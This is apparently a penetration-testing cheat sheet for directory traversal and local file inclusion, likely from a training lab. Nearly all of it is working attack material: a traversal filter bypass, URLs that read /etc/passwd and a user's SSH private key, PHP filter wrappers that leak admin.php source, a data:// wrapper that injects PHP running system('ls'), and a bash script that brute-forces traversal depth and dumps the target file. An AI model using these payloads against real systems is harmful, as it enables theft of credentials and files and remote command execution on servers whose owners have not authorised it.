

### BYPASS
```shell
Normal --> ../../../../etc/passwd
Bypass --> ....//....//....//.....//etc/passwd
```


### EXAMPLE
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd

http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```


### WRAPPERS
```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```


### SCRIPT PATH TRAVERSAL
```sh
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```